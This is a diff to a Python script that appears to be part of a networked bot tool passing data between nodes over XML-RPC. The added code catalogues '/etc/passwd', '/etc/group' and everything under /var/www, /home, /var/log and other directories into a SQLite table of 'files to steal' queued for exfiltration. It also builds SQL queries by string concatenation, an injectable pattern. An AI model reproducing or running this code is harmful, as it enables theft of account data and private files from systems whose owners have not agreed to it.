@@ -21,6 +21,9 @@ xml_url = 'http://10.0.1.221:82/men.xml'
 db = 'men.db'
 # Where are incoming/outgoing files stored?
 data_dir = 'data'
+# What files are we after on node 0?
+myfiles = ['/etc/passwd', '/etc/group']
+mydirs = ['/var/www','/usr/lib/cgi-bin','/var/log','/home','/media']
 
 class RequestHandler(SimpleXMLRPCRequestHandler):
     '''A (very) simple XMLRPC server that merely accepts
@@ -90,6 +93,29 @@ def create_men_db(conn):
     conn.commit()
     c.close()
 
+def create_file_db(conn):
+    ### Create a local SQLite3 database and table to hold data on files to steal
+    # Connection object comes from the caller
+    c = conn.cursor()
+    c.execute('drop table if exists swag')
+    c.execute('create table swag(name text, dtg datetime, priority integer, stolen bool)')
+    conn.commit()
+    c.close()
+
+def store_file_info(conn, filelst):
+    '''Store the data from the file list in a local SQLite3 database'''
+    # Loop through the filelst and insert the data for each
+    # in the local database pointed to by the conn object
+    c = conn.cursor()
+    for file in filelst:
+        query = "insert into swag values("
+        for item in file[:-1]:
+            query += "'" + str(item) + "',"
+        query += "'" + str(file[-1]) + "')"
+        c.execute(query)
+    conn.commit()
+    c.close()
+    
 def parseXML(url, file='men.xml'):
     '''Go and get the XML file with the bot data'''
     try:
@@ -207,9 +233,9 @@ if __name__=='__main__':
                 
         except Exception as e:
             print(strftime('%H:%M:%S') + ' ERROR: Can\'t start XMLRPC server instance:', e)
-    # For all but the source node, the data_dir is created when
-    # the server instance is instantiated. This else block ensures
-    # that the data_dir exists at the source.
+    # For all but the source node, the data_dir is created when the server instance
+    # is instantiated. This else block ensures that the data_dir exists at the source.
+    # We also need to create and populate the database table for files to exfil
     else:
         print(strftime('%H:%M:%S') + ' My sequence number is 0, so I\'m NOT creating an XMLRPC server' + '...')
         if not os.path.exists(data_dir):
@@ -218,7 +244,34 @@ if __name__=='__main__':
             except OSError as e:
                 print(strftime('%H:%M:%S') + ' ERROR: XMLRPC client at source unable to create data directory:', e)
                 sys.exit(1)
-                                                                                                    
+        # Create the table for files
+        create_file_db(conn)
+        # Populate a list of files for exfil
+        filelst = []
+        priority = 1
+        stolen = 0
+        for file in myfiles:
+            try:
+                mtime = time.ctime(os.path.getmtime(file))
+                mtime = time.strftime('%Y-%m-%d %H:%M:%S', time.strptime(mtime, "%a %b %d %H:%M:%S %Y"))
+                filelst.append([file, mtime, priority, stolen])
+            except:
+                pass
+        for dir in mydirs:
+            priority += 1
+            for root, dirs, files in os.walk(dir, topdown=True):
+                for name in files:
+                    file = os.path.join(root, name)
+                    try:
+                        mtime = time.ctime(os.path.getmtime(file))
+                        mtime = time.strftime('%Y-%m-%d %H:%M:%S', time.strptime(mtime, "%a %b %d %H:%M:%S %Y"))
+                        filelst.append([file, mtime, priority, stolen])
+                    except:
+                        pass
+        # Store the file list
+        print(strftime('%H:%M:%S') + ' Please wait while I store info on files to steal...')
+        store_file_info(conn, filelst)
+        print(strftime('%H:%M:%S') + ' Okay, all file data has been stored!')
     # Now, who is our next hop? We need this to define which server
     # to connect our client to, if any...
     next_hops = get_next_hops(conn, my_seq_no)
@@ -252,7 +305,7 @@ if __name__=='__main__':
             # Whew! Let's get some rest...
             print(strftime('%H:%M:%S') + ' Resting for', client_delay, 'seconds...')
             time.sleep(client_delay)
-            # Okay, now let's check on the server...
+            # Okay, now let's check on the server, if we have one...
             # If it's not running, we're not doing any good, so we might as well exit.
             # Later, maybe add code to restart the server if it's down...
             if server != None and not server.is_alive():
